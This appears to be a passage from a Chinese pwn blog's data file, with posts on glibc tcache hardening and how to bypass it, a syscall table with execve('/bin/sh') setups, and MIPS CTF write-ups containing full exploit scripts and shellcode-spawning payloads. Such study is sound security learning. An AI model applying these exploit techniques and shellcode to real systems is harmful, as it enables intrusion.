class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span> *<span class=\"title\">key</span>;</span>   <span class=\"comment\">/* ← 指向 tcache 本身 */</span></span><br><span class=\"line\">&#125; tcache_entry;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span></span><br><span class=\"line\"><span class=\"title function_\">tcache_put</span> <span class=\"params\">(tcache_perthread_struct *tcache, tcache_entry *e, <span class=\"type\">size_t</span> tc_idx)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* 1. 先检查链表长度 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tcache-&gt;counts[tc_idx] &gt;= TCACHE_MAX_BINS)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* 2. 关键：double-free 检测 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class=\"line\">        malloc_printerr (<span class=\"string\">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* 3. 把 chunk 插入链表头 */</span></span><br><span class=\"line\">    e-&gt;key = tcache;                  <span class=\"comment\">// 标记“我已进 tcache”</span></span><br><span class=\"line\">    e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class=\"line\">    tcache-&gt;entries[tc_idx] = e;</span><br><span class=\"line\">    tcache-&gt;counts[tc_idx]++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>简单解析一下:</p>\n<ol>\n<li>key字段开始不作设置</li>\n<li>当堆块通过 <code>double-free</code>时,也就是<code>e-&gt;key!=tcache</code>时,<code>e</code>进入<code>tcache bins</code>中,并把<code>key</code>设置为<code>tcahche</code></li>\n<li>那么下次<code>free(e)</code>,就会检测到这个的key,从而判断是否<code>double-free</code>.</li>\n</ol>\n<p>但是,想要绕过也非常简单.想要继续<code>double free</code>,只要能修改到key字段就可以继续这个利用.<br>而修改next的方法可以照旧.</p>\n<p>这个检测,仅仅是为了针对<code>double free</code>而已,所以局限很大.对安全方面的加强有点,但多.</p>\n<h3 id=\"2-30微调-counts加宽\"><a href=\"#2-30微调-counts加宽\" class=\"headerlink\" title=\"2.30微调-counts加宽\"></a>2.30微调-counts加宽</h3><p>没有大改,也不知道为啥要这么改动.效果不知道,目的不知道. </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TCACHE_MAX_BINS 64</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>          counts[TCACHE_MAX_BINS];   <span class=\"comment\">/* 0x00 */</span></span><br><span class=\"line\">    tcache_entry *entries[TCACHE_MAX_BINS];  <span class=\"comment\">/* 0x80 */</span></span><br><span class=\"line\">&#125; tcache_perthread_struct;   </span><br></pre></td></tr></table></figure>\n\n<p>在2.26 和 2.27 中, 这个字段是char 类型,也就是只有8位, 1字节.   现在加宽, 改为16位, 2字节.<br>以后修改 entries 数组时,需要把偏移调整一下.</p>\n<h3 id=\"2-32小加强-entries加密\"><a href=\"#2-32小加强-entries加密\" class=\"headerlink\" title=\"2.32小加强-entries加密\"></a>2.32小加强-entries加密</h3><p>entries的加密,让之前直接修改next 的利用变得稍微困难了一点. 我们必须明确一个点,tcache bins 中, chunk 的 下一个堆块 原本是有next 决定的,因为entries 就是 直接 用next的值.<br>但是现在不是了, entries 是 (&amp;next&gt;&gt;12) ^ next . 但是因为加密的算法是固定的,所以 我们只要能泄露堆地址,就可以继续伪造.</p>\n<h4 id=\"相关源码-2\"><a href=\"#相关源码-2\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PROTECT_PTR(pos, ptr) \\</span></span><br><span class=\"line\"><span class=\"meta\">        ((__typeof (ptr)) (((size_t) pos &gt;&gt; 12) ^ (size_t) (ptr)))</span></span><br></pre></td></tr></table></figure>\n\n<p>假设 你要写入的 地址是 target , 你现在修改的chunk 的 next 指针的地址是addr. 那么你实际需要写入next 的值是 (addr&gt;&gt;12) ^ target. </p>\n<p>计算同样非常简单.</p>\n<h3 id=\"2-34小加强-key随机化\"><a href=\"#2-34小加强-key随机化\" class=\"headerlink\" title=\"2.34小加强-key随机化\"></a>2.34小加强-key随机化</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> __thread tcache_perthread_struct *tcache = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"type\">static</span> __thread <span class=\"type\">size_t</span> tcache_key = <span class=\"number\">0</span>;   <span class=\"comment\">/* ← 不再是 tcache 地址，而是随机值 */</span></span><br></pre></td></tr></table></figure>\n\n<p>虽然是小加强, 因为此时要获取key似乎只能爆破.但是我不明白,因为对key字段的检测,只有在这个堆块被free 要进入tcache bins 时.</p>\n<p>也就是说,其实很多时候根本触发不了这个检测.</p>\n<h2 id=\"利用手法\"><a href=\"#利用手法\" class=\"headerlink\" title=\"利用手法\"></a>利用手法</h2><h3 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h3><p><a href=\"https://bbs.kanxue.com/thread-275302.htm#msg_header_h2_4\">[原创]tcache bin利用总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>\n","excerpt":"","more":"<h1 id=\"tcache的发展历程\"><a href=\"#tcache的发展历程\" class=\"headerlink\" title=\"tcache的发展历程\"></a>tcache的发展历程</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>经建议，笔者打算参加一次xctf 的分站赛，为此开始备注。遂开始复现往届比赛赛题。先从这次sekaictf-2025开始。这是从第一题开始的分析与延伸。</p>\n<h2 id=\"tcache的引入及更新\"><a href=\"#tcache的引入及更新\" class=\"headerlink\" title=\"tcache的引入及更新\"></a>tcache的引入及更新</h2><h3 id=\"2-26-2-27\"><a href=\"#2-26-2-27\" class=\"headerlink\" title=\"2.26-2.27\"></a>2.26-2.27</h3><p>首先，tcache 在glibc 2.26 版本登场，其目的是为了加快堆块的管理。因此在没有作安全的检测，也为之后的利用埋下了隐患。</p>\n<h4 id=\"相关源码\"><a href=\"#相关源码\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TCACHE_MAX_BINS 64</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span>          counts[TCACHE_MAX_BINS];   <span class=\"comment\">/* 0x00 */</span></span><br><span class=\"line\">    tcache_entry *entries[TCACHE_MAX_BINS];  <span class=\"comment\">/* 0x40 */</span></span><br><span class=\"line\">&#125; tcache_perthread_struct;                   <span class=\"comment\">/* 总长 0x290 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> *<span class=\"title\">next</span>;</span>   <span class=\"comment\">/* 仅 8 字节 */</span></span><br><span class=\"line\">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>\n\n<p>在glibc2.26 和 glibc2.27 的版本中，没有任何安全检测的手段。可以修改tcache chunk(指链入tache bins 中的堆块) 的next 字段，完成任意地址分配。</p>\n<p>当然，为了便于tcache 的管理，加入了<code>tcache_perthread_struct</code> 结构体.<br><code>counts</code> 数组,用来记录每个大小的<code>tcache bins</code> 中的数量<br><code>entries</code>数组用来记录每个<code>tcache chunk</code>的<code>next</code>字段的地址<br>同理,我们可以修改<code>counts</code> 和<code>entries</code>来欺骗系统,完成任意地址分配.</p>\n<p>因为没有任何检测,所以我们可以完成<code>double free</code>,甚至你可以把同一个堆块连续free 7次,把tcache bins 填满.</p>\n<h3 id=\"2-28-第一次补丁\"><a href=\"#2-28-第一次补丁\" class=\"headerlink\" title=\"2.28 第一次补丁\"></a>2.28 第一次补丁</h3><p>显然,注意到了<code>double free</code>的利用过于easy, 于是<code>tcache</code> 迎来了他的第一次更新, 添加了 key 这个变量. 在2.29 版本没有什么改动</p>\n<h4 id=\"相关源码-1\"><a href=\"#相关源码-1\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span> *<span class=\"title\">key</span>;</span>   <span class=\"comment\">/* ← 指向 tcache 本身 */</span></span><br><span class=\"line\">&#125; tcache_entry;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span></span><br><span class=\"line\"><span class=\"title function_\">tcache_put</span> <span class=\"params\">(tcache_perthread_struct *tcache, tcache_entry *e, <span class=\"type\">size_t</span> tc_idx)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* 1. 先检查链表长度 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tcache-&gt;counts[tc_idx] &gt;= TCACHE_MAX_BINS)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* 2. 关键：double-free 检测 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class=\"line\">        malloc_printerr (<span class=\"string\">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* 3. 把 chunk 插入链表头 */</span></span><br><span class=\"line\">    e-&gt;key = tcache;                  <span class=\"comment\">// 标记“我已进 tcache”</span></span><br><span class=\"line\">    e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class=\"line\">    tcache-&gt;entries[tc_idx] = e;</span><br><span class=\"line\">    tcache-&gt;counts[tc_idx]++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>简单解析一下:</p>\n<ol>\n<li>key字段开始不作设置</li>\n<li>当堆块通过 <code>double-free</code>时,也就是<code>e-&gt;key!=tcache</code>时,<code>e</code>进入<code>tcache bins</code>中,并把<code>key</code>设置为<code>tcahche</code></li>\n<li>那么下次<code>free(e)</code>,就会检测到这个的key,从而判断是否<code>double-free</code>.</li>\n</ol>\n<p>但是,想要绕过也非常简单.想要继续<code>double free</code>,只要能修改到key字段就可以继续这个利用.<br>而修改next的方法可以照旧.</p>\n<p>这个检测,仅仅是为了针对<code>double free</code>而已,所以局限很大.对安全方面的加强有点,但多.</p>\n<h3 id=\"2-30微调-counts加宽\"><a href=\"#2-30微调-counts加宽\" class=\"headerlink\" title=\"2.30微调-counts加宽\"></a>2.30微调-counts加宽</h3><p>没有大改,也不知道为啥要这么改动.效果不知道,目的不知道. </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TCACHE_MAX_BINS 64</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>          counts[TCACHE_MAX_BINS];   <span class=\"comment\">/* 0x00 */</span></span><br><span class=\"line\">    tcache_entry *entries[TCACHE_MAX_BINS];  <span class=\"comment\">/* 0x80 */</span></span><br><span class=\"line\">&#125; tcache_perthread_struct;   </span><br></pre></td></tr></table></figure>\n\n<p>在2.26 和 2.27 中, 这个字段是char 类型,也就是只有8位, 1字节.   现在加宽, 改为16位, 2字节.<br>以后修改 entries 数组时,需要把偏移调整一下.</p>\n<h3 id=\"2-32小加强-entries加密\"><a href=\"#2-32小加强-entries加密\" class=\"headerlink\" title=\"2.32小加强-entries加密\"></a>2.32小加强-entries加密</h3><p>entries的加密,让之前直接修改next 的利用变得稍微困难了一点. 我们必须明确一个点,tcache bins 中, chunk 的 下一个堆块 原本是有next 决定的,因为entries 就是 直接 用next的值.<br>但是现在不是了, entries 是 (&amp;next&gt;&gt;12) ^ next . 但是因为加密的算法是固定的,所以 我们只要能泄露堆地址,就可以继续伪造.</p>\n<h4 id=\"相关源码-2\"><a href=\"#相关源码-2\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PROTECT_PTR(pos, ptr) \\</span></span><br><span class=\"line\"><span class=\"meta\">        ((__typeof (ptr)) (((size_t) pos &gt;&gt; 12) ^ (size_t) (ptr)))</span></span><br></pre></td></tr></table></figure>\n\n<p>假设 你要写入的 地址是 target , 你现在修改的chunk 的 next 指针的地址是addr. 那么你实际需要写入next 的值是 (addr&gt;&gt;12) ^ target. </p>\n<p>计算同样非常简单.</p>\n<h3 id=\"2-34小加强-key随机化\"><a href=\"#2-34小加强-key随机化\" class=\"headerlink\" title=\"2.34小加强-key随机化\"></a>2.34小加强-key随机化</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> __thread tcache_perthread_struct *tcache = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"type\">static</span> __thread <span class=\"type\">size_t</span> tcache_key = <span class=\"number\">0</span>;   <span class=\"comment\">/* ← 不再是 tcache 地址，而是随机值 */</span></span><br></pre></td></tr></table></figure>\n\n<p>虽然是小加强, 因为此时要获取key似乎只能爆破.但是我不明白,因为对key字段的检测,只有在这个堆块被free 要进入tcache bins 时.</p>\n<p>也就是说,其实很多时候根本触发不了这个检测.</p>\n<h2 id=\"利用手法\"><a href=\"#利用手法\" class=\"headerlink\" title=\"利用手法\"></a>利用手法</h2><h3 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h3><p><a href=\"https://bbs.kanxue.com/thread-275302.htm#msg_header_h2_4\">[原创]tcache bin利用总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>\n"},{"title":"系统调用号","cover":"/img/达令.png","_content":"# syscall 知识梳理\n\n##  系统调用号\n\n### 32位\n```\nread 3     eax=3  ebx=fd ecx=buf edx=size\nwrite 4    eax=4  ebx=fd ecx=buf edx=size\nopen 5     eax=5  ebx=path ecx=flags edx=mode\nclose 6    eax=6  ebx=fd\nexecve 11  eax=0xb  ebx=\"/bin/sh\\x00\" ecx=0 edx=0\n\nint 0x80\n```\n### 64位\n```\nread 0     rax=0 rdi=fd rsi=buf rdx=size\nwrite 1    rax=1 rdi=fd rsi=buf rdx=size\nopen 2     rax=2 rdi=patch rsi=flags rdx=mode\nclose 3    rax=3 rdi=fd \nexecve 59  rax=0x3b rdi=\"/bin/sh\\x00\" rsi=0 rdx=0\n\nsys_call\n```\n","source":"_posts/syscall/syscall.md","raw":"---\ntitle: 系统调用号\ntags:\n    - syscall\n    - pwn\ncategories:\n    - 知识梳理\ncover: /img/达令.png\n---\n# syscall 知识梳理\n\n##  系统调用号\n\n### 32位\n```\nread 3     eax=3  ebx=fd ecx=buf edx=size\nwrite 4    eax=4  ebx=fd ecx=buf edx=size\nopen 5     eax=5  ebx=path ecx=flags edx=mode\nclose 6    eax=6  ebx=fd\nexecve 11  eax=0xb  ebx=\"/bin/sh\\x00\" ecx=0 edx=0\n\nint 0x80\n```\n### 64位\n```\nread 0     rax=0 rdi=fd rsi=buf rdx=size\nwrite 1    rax=1 rdi=fd rsi=buf rdx=size\nopen 2     rax=2 rdi=patch rsi=flags rdx=mode\nclose 3    rax=3 rdi=fd \nexecve 59  rax=0x3b rdi=\"/bin/sh\\x00\" rsi=0 rdx=0\n\nsys_call\n```\n","slug":"syscall/syscall","published":1,"date":"2025-03-24T14:32:33.539Z","updated":"2025-08-06T11:05:38.008Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ig0026uomy0r6d2muu","content":"<h1 id=\"syscall-知识梳理\"><a href=\"#syscall-知识梳理\" class=\"headerlink\" title=\"syscall 知识梳理\"></a>syscall 知识梳理</h1><h2 id=\"系统调用号\"><a href=\"#系统调用号\" class=\"headerlink\" title=\"系统调用号\"></a>系统调用号</h2><h3 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read 3     eax=3  ebx=fd ecx=buf edx=size</span><br><span class=\"line\">write 4    eax=4  ebx=fd ecx=buf edx=size</span><br><span class=\"line\">open 5     eax=5  ebx=path ecx=flags edx=mode</span><br><span class=\"line\">close 6    eax=6  ebx=fd</span><br><span class=\"line\">execve 11  eax=0xb  ebx=&quot;/bin/sh\\x00&quot; ecx=0 edx=0</span><br><span class=\"line\"></span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n<h3 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read 0     rax=0 rdi=fd rsi=buf rdx=size</span><br><span class=\"line\">write 1    rax=1 rdi=fd rsi=buf rdx=size</span><br><span class=\"line\">open 2     rax=2 rdi=patch rsi=flags rdx=mode</span><br><span class=\"line\">close 3    rax=3 rdi=fd </span><br><span class=\"line\">execve 59  rax=0x3b rdi=&quot;/bin/sh\\x00&quot; rsi=0 rdx=0</span><br><span class=\"line\"></span><br><span class=\"line\">sys_call</span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<h1 id=\"syscall-知识梳理\"><a href=\"#syscall-知识梳理\" class=\"headerlink\" title=\"syscall 知识梳理\"></a>syscall 知识梳理</h1><h2 id=\"系统调用号\"><a href=\"#系统调用号\" class=\"headerlink\" title=\"系统调用号\"></a>系统调用号</h2><h3 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read 3     eax=3  ebx=fd ecx=buf edx=size</span><br><span class=\"line\">write 4    eax=4  ebx=fd ecx=buf edx=size</span><br><span class=\"line\">open 5     eax=5  ebx=path ecx=flags edx=mode</span><br><span class=\"line\">close 6    eax=6  ebx=fd</span><br><span class=\"line\">execve 11  eax=0xb  ebx=&quot;/bin/sh\\x00&quot; ecx=0 edx=0</span><br><span class=\"line\"></span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n<h3 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read 0     rax=0 rdi=fd rsi=buf rdx=size</span><br><span class=\"line\">write 1    rax=1 rdi=fd rsi=buf rdx=size</span><br><span class=\"line\">open 2     rax=2 rdi=patch rsi=flags rdx=mode</span><br><span class=\"line\">close 3    rax=3 rdi=fd </span><br><span class=\"line\">execve 59  rax=0x3b rdi=&quot;/bin/sh\\x00&quot; rsi=0 rdx=0</span><br><span class=\"line\"></span><br><span class=\"line\">sys_call</span><br></pre></td></tr></table></figure>\n"},{"title":"mips练习","cover":"/img/紫发.png","_content":"# mips-题目练习\n\n## 前言 \n\n上次学mips的时候就打算在buuctf上写两道题目看看效果，巩固一下。但是当天buuctf不知道怎么回事，g掉了。写不了题目了，直到现在，才有时间写这两道题目。\n\n这两道题目应该也是非常经典了，网上有很多对这个的分析，题解。mips的前置知识呢写在了其他博客里面，在这里就啰嗦了。直接上题目。\n\n## axb_2019_mips\n\n这是一道`ret2shellcode` 的题目，非常的经典. 因为mips架构,不会开启NX 和 ASLR,所以我们可以往栈上,写shellcode,栈地址空间每次也都是一样的.所以非常好绕,不用泄露信息什么的.\n\n但是,因为远程环境和本地环境的区别,远程和本地的地址空间不一定一样.所以远程还是不能直接这么打.继续看题\n\n### ida分析\n\n![mian函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152019651.png)\n\n非常简单的程序,没有什么利用点,看`vuln()`\n\n![vuln函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152120201.png)\n\n发现溢出漏洞了，可以修改返回地址，但是要看汇编确定`$ra`的位置。\n\n![vuln函数汇编](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152621302.png)\n\n说真的，有的时候看汇编比看伪代码好。通过这个代码段，我们也可以了解到mips架构调用函数的一个流程。\n\n进入之后，先把`$sp`往上移动0x40,然后分别把`$ra`和`$fp`放在`$sp+0x3c`和`$sp+0x38` 的位置.\n\n在read时,会往`$sp+0x18`的位置读入0x200字节.所以输入`0x20`字节数据后就可以覆盖`$fp`和`$ra`.\n\n### 思路分析\n\n1. 之前说过可以直接写shellcode在栈上,然后把返回地址设置成栈上的地址就可以了,这个在本地完全可以这么打,但是远程的栈地址和本地会不一样,也不要想着爆破.\n2. 所以,我们转换思路,通过返回到read 函数,把shellcode 写到bss段上,在返回到bss段上执行,也是非常简便的方法.\n3. 如何控制read 的buf呢?在`0x40080c`的位置,有两条指令,分别是从栈上取出保存的`$fp`和`$ra`,那么只要我们覆盖到这里,就可以控制,取出来之后的这两个寄存器. 同时注意到read 是通过`$fp`来计算buf 的,所以控制了`$fp`,就控制了buf.\n4. 那么如何控制程序跳转到shllcode呢?或者说,第二次的返回地址应该写在哪呢?因为`$fp`和`$ra`都是通过`$sp`寻找的,所以要特别关注`$sp`的变化,发现在read的结束之后又一条指令`move $sp, $fp` ,这会是`$sp`移到`$fp`的位置,所以第二次的返回地址,写在第二次的payload里,计算好偏移即可.\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.arch=\"mips\"\n#io=process([\"qemu-mipsel\",\"-L\",\"/home/tsq/Desktop/iot/DIR-815/_DIR-815.bin.extracted/squashfs-root/\",\"-g\",\"1234\",\"./pwn\"])\nio=remote(\"node5.buuoj.cn\",26700)\n\nname=\"a\"*0x14\npayload=b\"a\"*0x20+p32(0x00410B80+0x18)+p32(0x004007E0)\nshellcode=asm('''\naddiu $sp, -0x40\nli $t7, 0x69622f2f\nsw $t7, -12($sp)\nli $t6, 0x68732f6e\nsw $t6, -8($sp)\nsw $zero, -4($sp)\nla $a0, -12($sp)\nli $v0, 4011\nmove $a1, $zero\nmove $a2, $zero\nsyscall\nnop\n''')\n\nprint(len(shellcode))\n\nio.sendafter(\"name: \\n\",name)\nsleep(3)\nio.send(payload)\npayload=b\"a\"*0x24+p32(0x00410Bb0+0x28)+shellcode\nio.send(payload)\n\nio.interactive()\n\n```\n\n## ycb_2020_mipspwn\n\n一回生,二回熟.再次看到同样,或者类似的read就非常得心应手\n\n### ida分析\n\n![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164722957.png)\n\n表面上是一个菜单,实际上核心只有description ,直接点进去看\n\n![description](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164826325.png)\n\n继续\n\n![vul汇编](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164919324.png)\n\n直接看汇编,除了偏移不一样,没有任何变化.和上一道题完全一样的方法\n\n### 思路分析\n\n1. 那我们想如何快速的计算出偏移呢?首先要确定fp 和 ra 的偏移,分别是0x50 和 0x54, 直接可以出来.然后是buf 的偏移,0x18.可以通过ida 反汇编看出来.\n2. 所以要写0x38的垃圾数据.所以如果都用0x50+var_xxx这种形式,直接看buf,这里xxx是多少,就是写多少垃圾数据.非常快速的找到偏移.\n3. 第二次shellcode 的偏移 也很好找.假设你第一次payload 设置的fp 是 bss_addr.那么第二次返回地址就是`p32(bss_add+0x18+0x40)`\n4. 0x18 是, read时 的偏移. 0x40 是,前面的垃圾数据,假设这个地址本身的长度.因为我们都会把shellcode 写在这个地址的后面.\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.arch=\"mips\"\n#io=process([\"qemu-mipsel\",\"-g\",\"1234\",\"./pwn\"])\nio=remote(\"node5.buuoj.cn\",26779)\n\ndef menu(op):\n\tio.sendlineafter(\"choice: \",str(op))\nbss=0x004115F0\nname=b\"a\"*4\npayload=b\"a\"*0x38+p32(bss+0x10)+p32(0x00400F50)\nshellcode=asm('''\naddiu $sp, -0x40\nli $t7, 0x69622f2f\nsw $t7, -12($sp)\nli $t6, 0x68732f6e\nsw $t6, -8($sp)\nsw $zero, -4($sp)\nla $a0, -12($sp)\nli $v0, 4011\nmove $a1, $zero\nmove $a2, $zero\nsyscall\nnop\n''')\n\nio.sendafter(\"here:\\n\",name)\nmenu(7)\nio.sendafter(\"feeling:\",payload)\n\n\npayload=b\"a\"*0x3c+p32(bss+0x10+0x18+0x40)+shellcode\nio.send(payload)\n\nio.interactive()\n\n```\n\n## 后记\n\n写两道题,对mips下的程序的一个调用一下就开朗了.对shellcode ,寄存器的运用也提高了,还是收获不小.这两道题上手也是非常的快. \n\n不过第一道题似乎需要uClibc,我是之前分析DIR-815固件时,binwalk提取出来这个libc ,我就直接用了.\n\n第二道题直接给了uClibc,可以直接写.","source":"_posts/异架构/mips题目练习.md","raw":"---\ntitle: mips练习\ntags:\n\t- mips\n\t- pwn\ncategories:\n\t- 做题笔记\ncover: /img/紫发.png\n---\n# mips-题目练习\n\n## 前言 \n\n上次学mips的时候就打算在buuctf上写两道题目看看效果，巩固一下。但是当天buuctf不知道怎么回事，g掉了。写不了题目了，直到现在，才有时间写这两道题目。\n\n这两道题目应该也是非常经典了，网上有很多对这个的分析，题解。mips的前置知识呢写在了其他博客里面，在这里就啰嗦了。直接上题目。\n\n## axb_2019_mips\n\n这是一道`ret2shellcode` 的题目，非常的经典. 因为mips架构,不会开启NX 和 